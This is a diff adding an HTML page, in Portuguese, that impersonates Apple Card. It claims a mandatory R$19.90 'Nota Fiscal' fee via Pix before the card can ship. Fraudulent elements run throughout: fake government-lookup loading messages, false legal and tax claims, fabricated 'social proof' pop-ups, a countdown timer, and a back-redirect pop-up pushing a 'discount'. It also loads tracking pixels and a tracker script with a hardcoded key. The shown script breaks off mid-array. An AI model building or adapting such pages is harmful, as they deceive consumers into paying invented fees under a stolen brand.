@@ -1,0 +1,559 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <script src="../tracker.js" data-offer="apple-card" data-dashboard="https://dash.nexustemp.top" data-key="tk_dash_2026_secretX" defer=""></script>
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.pixelId = "6a34b5e951dbbcea6045170a";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+<script src="js/t.js" data-id="apple-card2" defer=""></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nota Fiscal — Apple Card</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&amp;display=swap" rel="stylesheet">
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{
+            --apple-black:#1D1D1F;--apple-blue:#0071E3;
+            --gray-100:#F5F5F7;--gray-200:#E8E8ED;--gray-300:#D2D2D7;
+            --gray-400:#86868B;--gray-500:#6E6E73;
+            --success:#34C759;--warning:#FF9F0A;--error:#FF3B30;
+            --surface:#FFFFFF;--pix-green:#32BCAD;
+        }
+        body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:var(--gray-100);color:var(--apple-black);-webkit-font-smoothing:antialiased;min-height:100vh;overflow-x:hidden}
+        .page{max-width:520px;margin:0 auto;min-height:100vh;background:var(--surface)}
+
+        /* Loading */
+        .loading-screen{position:fixed;inset:0;background:var(--surface);z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity .4s}
+        .loading-screen.hide{opacity:0;pointer-events:none}
+        .loading-logo{width:48px;height:48px;margin-bottom:24px}
+        .loading-spinner{width:32px;height:32px;border:3px solid var(--gray-200);border-top-color:var(--apple-blue);border-radius:50%;animation:spin .8s linear infinite;margin-bottom:16px}
+        .loading-msg{font-size:.8125rem;color:var(--gray-500)}
+
+        /* Nav */
+        .nav{display:flex;align-items:center;padding:14px 20px;border-bottom:.5px solid var(--gray-200);background:rgba(255,255,255,.92);backdrop-filter:blur(20px);position:sticky;top:0;z-index:100}
+        .nav-title{flex:1;text-align:center;font-size:.9375rem;font-weight:700}
+
+        /* Info Banner */
+        .info-banner{margin:16px 20px;padding:16px;background:linear-gradient(135deg,#F5F5F7,#E8E8ED);border-radius:14px;display:flex;gap:14px;align-items:flex-start}
+        .ib-icon{width:44px;height:44px;border-radius:12px;background:var(--apple-blue);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .ib-icon svg{width:22px;height:22px;fill:#fff}
+        .ib-text h2{font-size:1rem;font-weight:700;margin-bottom:3px}
+        .ib-text p{font-size:.8125rem;color:var(--gray-500);line-height:1.5}
+
+        .content{padding:0 20px 100px}
+
+        /* Document preview */
+        .doc-preview{margin:16px 0;background:var(--gray-100);border-radius:16px;padding:20px;border:1.5px dashed var(--gray-300)}
+        .doc-header{display:flex;align-items:center;gap:10px;margin-bottom:14px}
+        .doc-icon{width:36px;height:36px;border-radius:8px;background:var(--apple-blue);display:flex;align-items:center;justify-content:center}
+        .doc-icon svg{width:18px;height:18px;fill:#fff}
+        .doc-header-text{font-size:.875rem;font-weight:700}
+        .doc-header-text small{display:block;font-size:.6875rem;color:var(--gray-400);font-weight:500}
+        .doc-rows{display:flex;flex-direction:column;gap:8px}
+        .doc-row{display:flex;justify-content:space-between;padding:8px 0;font-size:.8125rem;border-bottom:1px solid var(--gray-200)}
+        .doc-row:last-child{border-bottom:none}
+        .doc-row .dr-label{color:var(--gray-500)}
+        .doc-row .dr-value{font-weight:600;text-align:right}
+        .doc-row .dr-value.blue{color:var(--apple-blue)}
+        .doc-row .dr-value.pending{display:inline-flex;align-items:center;gap:4px;color:var(--warning)}
+        .doc-row .dr-value.pending svg{width:14px;height:14px;fill:var(--warning)}
+
+        /* Reason cards */
+        .reason-grid{display:flex;flex-direction:column;gap:10px;margin:16px 0}
+        .reason-card{display:flex;gap:12px;align-items:flex-start;padding:14px;background:var(--gray-100);border-radius:12px}
+        .rc-icon{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .rc-icon.blue{background:rgba(0,113,227,.1)}
+        .rc-icon.blue svg{fill:var(--apple-blue)}
+        .rc-icon.green{background:rgba(52,199,89,.1)}
+        .rc-icon.green svg{fill:var(--success)}
+        .rc-icon.purple{background:rgba(175,82,222,.1)}
+        .rc-icon.purple svg{fill:#AF52DE}
+        .rc-icon svg{width:16px;height:16px}
+        .rc-text{font-size:.8125rem;line-height:1.5}
+        .rc-text strong{display:block;font-size:.875rem;margin-bottom:2px}
+
+        /* Comparison */
+        .comparison{margin:16px 0;display:grid;grid-template-columns:1fr 1fr;gap:10px}
+        .comp-card{padding:16px;border-radius:14px;text-align:center}
+        .comp-card.without{background:rgba(255,59,48,.06);border:1.5px solid rgba(255,59,48,.12)}
+        .comp-card.with{background:rgba(52,199,89,.06);border:1.5px solid rgba(52,199,89,.12)}
+        .comp-card .cc-icon{margin-bottom:8px;display:flex;justify-content:center}
+        .comp-card .cc-icon svg{width:28px;height:28px}
+        .comp-card.without .cc-icon svg{fill:var(--error)}
+        .comp-card.with .cc-icon svg{fill:var(--success)}
+        .comp-card .cc-title{font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:.5px;margin-bottom:10px}
+        .comp-card.without .cc-title{color:var(--error)}
+        .comp-card.with .cc-title{color:var(--success)}
+        .comp-card .cc-item{font-size:.6875rem;color:var(--gray-500);padding:4px 0;line-height:1.4;display:flex;align-items:center;justify-content:center;gap:4px}
+        .cc-item svg{width:12px;height:12px;flex-shrink:0}
+        .cc-item svg.x{fill:var(--error)}
+        .cc-item svg.check{fill:var(--success)}
+
+        /* Pay section */
+        .pay-section{margin-top:20px}
+        .pay-block{background:var(--surface);border:2px solid var(--apple-blue);border-radius:16px;padding:20px;position:relative;overflow:hidden}
+        .pay-block::before{content:'Recomendado';position:absolute;top:0;right:0;padding:4px 14px;background:var(--apple-blue);color:#fff;font-size:.625rem;font-weight:700;text-transform:uppercase;letter-spacing:.5px;border-radius:0 14px 0 10px}
+        .pay-block-price{text-align:center;margin:10px 0 16px}
+        .pay-block-price .pbp-value{font-size:2.25rem;font-weight:800;color:var(--apple-blue)}
+        .pay-block-price .pbp-desc{font-size:.75rem;color:var(--gray-500);margin-top:4px}
+
+        /* Pay button */
+        .pay-btn{display:block;width:100%;padding:18px;border:none;border-radius:14px;font-size:1.0625rem;font-weight:700;cursor:pointer;font-family:inherit;background:var(--apple-blue);color:#fff;text-align:center;transition:all .3s;position:relative;overflow:hidden}
+        .pay-btn:hover{opacity:.9}
+        .pay-btn:active{transform:scale(.98)}
+        .pay-btn .shine{position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.15),transparent);animation:btnShine 3s ease infinite}
+        .pay-btn.loading .pay-btn-label{opacity:0}
+        .pay-btn.loading .shine{display:none}
+        .pay-btn.loading::after{content:'';position:absolute;top:50%;left:50%;width:24px;height:24px;margin:-12px;border:3px solid rgba(255,255,255,.2);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite}
+        .pay-btn-label{display:flex;align-items:center;justify-content:center;gap:8px}
+
+        .pay-trust{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:12px;font-size:.6875rem;color:var(--gray-400)}
+        .pay-trust svg{width:10px;height:10px;fill:var(--gray-400)}
+
+        /* Decline */
+        .decline-link{display:block;text-align:center;padding:20px;font-size:.75rem;color:var(--gray-400);cursor:pointer}
+
+        /* Social proof */
+        .social-proof{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);max-width:340px;width:calc(100% - 40px);padding:10px 14px;background:var(--surface);border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.12);display:flex;align-items:center;gap:10px;font-size:.75rem;z-index:90;opacity:0;transform:translateX(-50%) translateY(20px);transition:all .4s;pointer-events:none}
+        .social-proof.show{opacity:1;transform:translateX(-50%) translateY(0)}
+        .sp-dot{width:8px;height:8px;border-radius:50%;background:var(--success);flex-shrink:0;animation:livePulse 2s ease infinite}
+        .sp-text{flex:1;color:var(--gray-500)}
+        .sp-text strong{color:var(--apple-black)}
+
+        /* PIX Modal */
+        .pix-overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);backdrop-filter:blur(8px);z-index:999;opacity:0;visibility:hidden;transition:all .3s;display:flex;align-items:flex-end;justify-content:center}
+        .pix-overlay.active{opacity:1;visibility:visible}
+        .pix-modal{background:var(--surface);border-radius:20px 20px 0 0;width:100%;max-width:520px;max-height:92vh;overflow-y:auto;padding:0;transform:translateY(100%);transition:transform .4s cubic-bezier(.32,.72,0,1)}
+        .pix-overlay.active .pix-modal{transform:translateY(0)}
+        .pix-modal-handle{width:36px;height:4px;background:var(--gray-300);border-radius:2px;margin:10px auto 0}
+        .pix-modal-header{padding:16px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:.5px solid var(--gray-200)}
+        .pix-modal-header h3{font-size:1rem;font-weight:700}
+        .pix-modal-close{width:28px;height:28px;border-radius:50%;background:var(--gray-100);border:none;cursor:pointer;display:flex;align-items:center;justify-content:center}
+        .pix-modal-close svg{width:14px;height:14px;fill:var(--gray-500)}
+        .pix-modal-body{padding:20px}
+        .pix-timer-bar{display:flex;align-items:center;gap:8px;padding:10px 14px;background:rgba(255,149,10,.08);border-radius:10px;margin-bottom:20px;font-size:.8125rem}
+        .pix-timer-bar svg{width:16px;height:16px;fill:var(--warning);flex-shrink:0}
+        .pix-timer-bar .ptb-text{flex:1;color:var(--gray-500)}
+        .pix-timer-bar .ptb-time{font-weight:700;color:var(--warning);font-variant-numeric:tabular-nums}
+        .qr-container{display:flex;flex-direction:column;align-items:center;margin-bottom:20px}
+        .qr-wrapper{position:relative;width:220px;height:220px;padding:12px;background:#fff;border-radius:16px;border:2px solid var(--gray-200);margin-bottom:12px}
+        .qr-wrapper img{width:100%;height:100%;object-fit:contain;border-radius:8px}
+        .qr-wrapper .qr-apple-logo{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:44px;height:44px;background:#fff;border-radius:10px;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(0,0,0,.1)}
+        .qr-wrapper .qr-apple-logo svg{width:22px;height:22px;fill:var(--apple-black)}
+        .qr-label{font-size:.75rem;color:var(--gray-500);text-align:center}
+        .copy-section{margin-bottom:20px}
+        .copy-section label{display:block;font-size:.75rem;font-weight:600;color:var(--gray-500);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px}
+        .copy-box{display:flex;gap:8px}
+        .copy-input{flex:1;padding:12px 14px;background:var(--gray-100);border:1.5px solid var(--gray-200);border-radius:10px;font-family:'Courier New',monospace;font-size:.7rem;color:var(--apple-black);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;outline:none}
+        .copy-btn{padding:12px 20px;background:var(--apple-black);color:#fff;border:none;border-radius:10px;font-size:.8125rem;font-weight:600;cursor:pointer;font-family:inherit;white-space:nowrap;transition:all .2s}
+        .copy-btn:active{transform:scale(.96)}
+        .copy-btn.copied{background:var(--success)}
+        .pix-steps{margin-bottom:20px;padding:16px;background:var(--gray-100);border-radius:14px}
+        .pix-steps-title{font-size:.8125rem;font-weight:600;margin-bottom:12px}
+        .pix-step{display:flex;gap:10px;margin-bottom:10px;font-size:.8125rem;color:var(--gray-500);line-height:1.4}
+        .pix-step:last-child{margin-bottom:0}
+        .pix-step-num{width:22px;height:22px;border-radius:50%;background:var(--apple-black);color:#fff;font-size:.6875rem;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .pix-status{text-align:center;padding:16px;background:rgba(255,149,10,.06);border-radius:14px;margin-bottom:16px;transition:all .4s}
+        .pix-status .ps-icon{width:48px;height:48px;border-radius:50%;margin:0 auto 8px;display:flex;align-items:center;justify-content:center}
+        .pix-status .ps-icon.waiting{background:rgba(255,149,10,.12)}
+        .pix-status .ps-icon.waiting svg{fill:var(--warning)}
+        .pix-status .ps-icon.paid{background:rgba(52,199,89,.12)}
+        .pix-status .ps-icon.paid svg{fill:var(--success)}
+        .pix-status .ps-icon svg{width:24px;height:24px}
+        .pix-status .ps-title{font-size:.9375rem;font-weight:700;margin-bottom:2px}
+        .pix-status .ps-desc{font-size:.75rem;color:var(--gray-500)}
+        .pix-status-dot{display:inline-block;width:6px;height:6px;border-radius:50%;margin-right:4px;vertical-align:middle}
+        .pix-status-dot.waiting{background:var(--warning);animation:livePulse 1.5s ease infinite}
+        .pix-status-dot.paid{background:var(--success)}
+
+        /* Back Redirect */
+        .br-overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(10px);z-index:9998;opacity:0;visibility:hidden;transition:all .3s;display:flex;align-items:center;justify-content:center;padding:20px}
+        .br-overlay.active{opacity:1;visibility:visible}
+        .br-modal{background:var(--surface);border-radius:20px;max-width:400px;width:100%;padding:28px;text-align:center;transform:scale(.9);transition:transform .3s}
+        .br-overlay.active .br-modal{transform:scale(1)}
+        .br-icon{width:56px;height:56px;margin:0 auto 16px;border-radius:50%;background:rgba(255,149,10,.1);display:flex;align-items:center;justify-content:center}
+        .br-icon svg{width:28px;height:28px;fill:var(--warning)}
+        .br-title{font-size:1.25rem;font-weight:800;margin-bottom:8px}
+        .br-desc{font-size:.875rem;color:var(--gray-500);line-height:1.5;margin-bottom:20px}
+        .br-highlight{display:inline-block;padding:8px 20px;background:rgba(0,113,227,.08);border-radius:10px;font-size:1.25rem;font-weight:800;color:var(--apple-blue);margin-bottom:20px}
+        .br-btn-accept{display:block;width:100%;padding:16px;border:none;border-radius:14px;font-size:1rem;font-weight:700;cursor:pointer;background:var(--apple-blue);color:#fff;font-family:inherit;margin-bottom:10px}
+        .br-btn-decline{display:block;width:100%;padding:12px;border:none;background:none;font-size:.8125rem;color:var(--gray-400);cursor:pointer;font-family:inherit}
+
+        @keyframes btnShine{0%{left:-100%}50%{left:100%}100%{left:100%}}
+        @keyframes livePulse{0%,100%{opacity:1}50%{opacity:.3}}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+        .fade-in{animation:fadeIn .4s ease both}
+        .fixed-cta{position:fixed;bottom:0;left:0;right:0;padding:12px 20px;background:rgba(255,255,255,.95);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-top:.5px solid var(--gray-200);z-index:95;transform:translateY(0)}
+        .fixed-cta button{display:block;width:100%;max-width:520px;margin:0 auto;padding:16px;border:none;border-radius:12px;font-size:1rem;font-weight:700;cursor:pointer;font-family:inherit;background:var(--apple-black);color:#fff}
+        .fixed-cta button:active{transform:scale(.98)}
+    </style>
+</head>
+<body>
+
+<!-- Loading -->
+<div class="loading-screen" id="loadingScreen">
+    <svg class="loading-logo" viewBox="0 0 24 24" fill="#1D1D1F"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"></path></svg>
+    <div class="loading-spinner"></div>
+    <div class="loading-msg" id="loadingMsg">Gerando nota fiscal...</div>
+</div>
+
+<!-- Page -->
+<div class="page" id="mainPage" style="display:none">
+    <nav class="nav">
+        <div class="nav-title">Nota Fiscal</div>
+    </nav>
+
+    <!-- Info Banner -->
+    <div class="info-banner fade-in">
+        <div class="ib-icon">
+            <svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"></path></svg>
+        </div>
+        <div class="ib-text">
+            <h2>Nota Fiscal Eletronica</h2>
+            <p>Obrigatoria para operacoes com produtos financeiros internacionais. Garante sua seguranca juridica.</p>
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- NF-e Preview -->
+        <div class="doc-preview fade-in">
+            <div class="doc-header">
+                <div class="doc-icon">
+                    <svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"></path></svg>
+                </div>
+                <div class="doc-header-text">
+                    NF-e Apple Card
+                    <small>Documento fiscal eletronico</small>
+                </div>
+            </div>
+            <div class="doc-rows">
+                <div class="doc-row">
+                    <span class="dr-label">Titular</span>
+                    <span class="dr-value" id="docName">—</span>
+                </div>
+                <div class="doc-row">
+                    <span class="dr-label">Produto</span>
+                    <span class="dr-value">Apple Card Titanium</span>
+                </div>
+                <div class="doc-row">
+                    <span class="dr-label">Status NF-e</span>
+                    <span class="dr-value pending"><svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"></path></svg> Pendente</span>
+                </div>
+                <div class="doc-row">
+                    <span class="dr-label">Taxa de emissao</span>
+                    <span class="dr-value blue" id="docPrice">R$ 19,90</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Reasons -->
+        <div class="reason-grid">
+            <div class="reason-card fade-in">
+                <div class="rc-icon blue"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"></path></svg></div>
+                <div class="rc-text">
+                    <strong>Protecao juridica</strong>
+                    Comprova legalmente a operacao financeira perante a Receita Federal.
+                </div>
+            </div>
+            <div class="reason-card fade-in">
+                <div class="rc-icon green"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path></svg></div>
+                <div class="rc-text">
+                    <strong>Garantia de entrega</strong>
+                    Sem a NF-e, a transportadora nao pode liberar o envio do cartao fisico.
+                </div>
+            </div>
+            <div class="reason-card fade-in">
+                <div class="rc-icon purple"><svg viewBox="0 0 24 24"><path d="M11 7h2v2h-2zm0 4h2v6h-2zm1-9C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"></path></svg></div>
+                <div class="rc-text">
+                    <strong>Conformidade fiscal</strong>
+                    Necessario para declaracao de bens financeiros no imposto de renda.
+                </div>
+            </div>
+        </div>
+
+        <!-- Comparison -->
+        <div class="comparison fade-in">
+            <div class="comp-card without">
+                <div class="cc-icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm5 13.59L15.59 17 12 13.41 8.41 17 7 15.59 10.59 12 7 8.41 8.41 7 12 10.59 15.59 7 17 8.41 13.41 12 17 15.59z"></path></svg></div>
+                <div class="cc-title">Sem NF-e</div>
+                <div class="cc-item"><svg class="x" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg> Envio bloqueado</div>
+                <div class="cc-item"><svg class="x" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg> Sem garantia legal</div>
+                <div class="cc-item"><svg class="x" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg> Problema na receita</div>
+                <div class="cc-item"><svg class="x" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg> Reenvio pago</div>
+            </div>
+            <div class="comp-card with">
+                <div class="cc-icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path></svg></div>
+                <div class="cc-title">Com NF-e</div>
+                <div class="cc-item"><svg class="check" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path></svg> Envio liberado</div>
+                <div class="cc-item"><svg class="check" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path></svg> Protecao juridica</div>
+                <div class="cc-item"><svg class="check" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path></svg> Tudo regularizado</div>
+                <div class="cc-item"><svg class="check" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path></svg> Reenvio gratuito</div>
+            </div>
+        </div>
+
+        <!-- Payment -->
+        <div class="pay-section">
+            <div class="pay-block">
+                <div class="pay-block-price">
+                    <div class="pbp-value" id="payPriceDisplay">R$ 19,90</div>
+                    <div class="pbp-desc">Taxa unica de emissao · Valida para sempre</div>
+                </div>
+                <button class="pay-btn" id="payBtn" onclick="generatePix()">
+                    <div class="shine"></div>
+                    <div class="pay-btn-label">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="#fff"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"></path></svg>
+                        <span>Emitir NF-e — <span id="payPrice">R$ 19,90</span></span>
+                    </div>
+                </button>
+                <div class="pay-trust">
+                    <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path></svg>
+                    Pagamento criptografado · Confirmacao imediata
+                </div>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<div class="fixed-cta show" id="fixedCta">
+    <button onclick="generatePix()">Emitir NF-e — <span id="fixedPrice">R$ 19,90</span></button>
+</div>
+
+<!-- Social Proof -->
+<div class="social-proof" id="socialProof">
+    <div class="sp-dot"></div>
+    <div class="sp-text" id="spText"><strong>Ana C.</strong> de BH emitiu a NF-e agora</div>
+</div>
+
+<!-- PIX Modal -->
+<div class="pix-overlay" id="pixOverlay">
+    <div class="pix-modal">
+        <div class="pix-modal-handle"></div>
+        <div class="pix-modal-header">
+            <h3>Pagamento Pix</h3>
+            <button class="pix-modal-close" onclick="closePixModal()"><svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg></button>
+        </div>
+        <div class="pix-modal-body">
+            <div class="pix-timer-bar">
+                <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"></path></svg>
+                <span class="ptb-text">Expira em</span>
+                <span class="ptb-time" id="pixTimer">29:59</span>
+            </div>
+            <div class="pix-status" id="pixStatus">
+                <div class="ps-icon waiting" id="pixStatusIcon"><svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"></path></svg></div>
+                <div class="ps-title"><span class="pix-status-dot waiting" id="pixStatusDot"></span> <span id="pixStatusText">Aguardando pagamento...</span></div>
+                <div class="ps-desc" id="pixStatusDesc">Escaneie o QR Code ou cole o codigo</div>
+            </div>
+            <div class="qr-container fade-in">
+                <div class="qr-wrapper">
+                    <img id="pixQrImage" src="" alt="QR Code Pix">
+                    <div class="qr-apple-logo"><svg viewBox="0 0 24 24" fill="#1D1D1F"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"></path></svg></div>
+                </div>
+                <div class="qr-label">Escaneie com o app do seu banco</div>
+            </div>
+            <div class="copy-section fade-in">
+                <label>Pix Copia e Cola</label>
+                <div class="copy-box">
+                    <input type="text" class="copy-input" id="pixCopyPaste" readonly="" value="">
+                    <button class="copy-btn" id="copyBtn" onclick="copyPixCode()">Copiar</button>
+                </div>
+            </div>
+            <div class="pix-steps fade-in">
+                <div class="pix-steps-title">Como pagar:</div>
+                <div class="pix-step"><div class="pix-step-num">1</div><span>Abra o app do seu banco</span></div>
+                <div class="pix-step"><div class="pix-step-num">2</div><span>Pix &gt; Escaneie ou cole o codigo</span></div>
+                <div class="pix-step"><div class="pix-step-num">3</div><span>Confirme — aprovacao instantanea!</span></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Back Redirect -->
+<div class="br-overlay" id="brOverlay">
+    <div class="br-modal">
+        <div class="br-icon">
+            <svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"></path></svg>
+        </div>
+        <div class="br-title">Sem nota fiscal?</div>
+        <div class="br-desc">Sem a NF-e, a transportadora <strong>nao libera o envio</strong> do seu Apple Card. Mas conseguimos um desconto exclusivo para voce:</div>
+        <div class="br-highlight" id="brPrice">R$ 9,90</div>
+        <button class="br-btn-accept" id="brAcceptBtn" onclick="acceptDiscount()">Emitir NF-e por R$ 9,90</button>
+        <button class="br-btn-decline" onclick="declineDiscount()">Continuar sem NF-e</button>
+    </div>
+</div>
+
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<script>
+const UPSELL_ID = 0;
+const PRICE_CENTS = 1990;
+const DISCOUNT_PRICE_CENTS = 990;
+const PRODUCT_NAME = 'Nota Fiscal Eletronica';
+const NEXT_UPSELL = '../up1/index.html';
+const API_BASE = '../../api';
+
+let currentPrice = PRICE_CENTS;
+let currentTransactionId = null;
+let statusCheckInterval = null;
+let pixTimerInterval = null;
+let pixTimerSeconds = 30 * 60;
+
+// UTM + Lead
+const utmKeys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];
+const params = new URLSearchParams(window.location.search);
+utmKeys.forEach(k => { const v = params.get(k); if(v) localStorage.setItem(k, v); });
+const LeadData = {
+    _key: 'applecard_lead',
+    load() { try { return JSON.parse(localStorage.getItem(this._key) || '{}') } catch { return {} } },
+    update(d) { const c = this.load(); const u = {...c,...d,updated_at:Date.now()}; localStorage.setItem(this._key, JSON.stringify(u)); return u; }
+};
+const leadData = LeadData.load();
+const nome = params.get('nome') || leadData.nome || leadData.name || '';
+if (nome) document.getElementById('docName').textContent = nome;
+
+// Loading
+const msgs = ['Gerando nota fiscal...','Consultando SEFAZ...','NF-e pendente de emissao'];
+function runLoading() {
+    const msg = document.getElementById('loadingMsg');
+    msgs.forEach((m,i) => setTimeout(() => msg.textContent = m, i * 700));
+    setTimeout(() => {
+        document.getElementById('loadingScreen').classList.add('hide');
+        document.getElementById('mainPage').style.display = '';
+        startSocialProof();
+        initBackRedirect();
+    }, 2200);
+}
+window.addEventListener('DOMContentLoaded', runLoading);
+
+// Social proof
+const proofs = [
